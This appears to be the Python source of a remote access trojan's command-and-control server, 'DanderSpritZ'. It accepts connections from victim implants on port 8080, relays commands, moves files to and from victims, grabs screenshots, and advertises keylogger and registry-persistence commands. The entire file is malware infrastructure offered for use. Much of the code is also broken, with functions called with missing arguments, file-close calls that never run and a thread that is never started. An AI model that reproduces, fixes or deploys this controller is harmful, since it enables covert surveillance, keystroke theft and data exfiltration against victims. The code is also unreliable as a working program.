## DanderSpritZ Server V2
## By ShowNadda

# Global Imports
import socket
import termcolor
import json
import os
import shutil
import sys
import threading

def reliable_send(target,data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(target,file_name):
    f = open(file_name, "rb")
    target.send(f.read())

def download_file(target,file_name):
    f= open(file_name, "wb")
    target.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
        target.settimeout(None)
        f.close

def reliable_recv(target):
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def target_communication(target):
    count = 0
    while True:
        command = input("DSZ:%s:" % str(ip))
        reliable_send(command)
        if command == "quit":
            break
        if command =="background":
            break
        elif command =="clear":
            os.system("clear")
        elif command[:3] == "cd ":
            pass
        elif command[:6] == "upload":
            upload_file(command[7:])
        elif command[:8] == "download":
            download_file(command[9:])
        elif command[:10] == "screenshot":
            f= open("screenshot%d" % (count), "wb")
            target.settimeout(5)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
                target.settimeout(None)
                f.close
                count += 1
        elif command == "help":
            print(termcolor.colored("""\n
            quit                                         = Closes the Target Implant
            clear                                        = Clears the Client Terminal
            cd *Directory Name*                          = Changes the current Directory
            upload *File name*                           = Upload file to Target
            download *File name*                         = Download file from the Target
            screenshot                                   = Screenshots the Target Desktop
            grok_start                                   = Starts the Keylogger
            grok_dump                                    = Dumps the Keylogs from Target
            grok_quit                                    = Stops and Self Destructs the Keylogger
            persist *Registry Key Name* *Implant Name*   = Creates Persistance for the Implant"""), "green")
        else:
            result = reliable_recv()
            print(result)

def accept_connections():
    while True:
        if stop_flag:
            break
    sock.settimeout(1)
    try:
        target, ip = sock.accept()
        targets.append(target)
        ips.append(ip)
        print(termcolor.colored(str(ip) + "has connected!", "green"))
    except:
        pass

targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 8080))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start
print(termcolor.colored("[+] DanderSpritZ v5 has successfully started!", "green"))
print(termcolor.colored("[!] Now Listening for incoming connections on port: 8080", "green"))

while True:
    command = input("DSZ [*]: ")
    if command == "targets":
        counter = 0
        for ip in ips:
            print("Session " + str(counter) + " --- " +str(ip))
            counter+= 1
    elif command == "clear":
        os.system("clear")
    elif command[:7] == "session":
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum,tarip)
        except:
            print(termcolor.colored("[-] Error: Invalid Session ID!","red"))
    elif command == "exit":
        for target in targets:
            reliable_send(target, quit)
            target.close()
        sock.close()
        stop_flag = True
        t1.join
        break
    elif command[:4] == "kill":
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, "quit")
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == "sendall":
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print(tarnumber)
                reliable_send(tarnumber, command)
        except:
            print(termcolor.colored("Failed!"), "red")
    else:
        print(termcolor.colored("[!] Error: Command doesn't exist!", "red"))
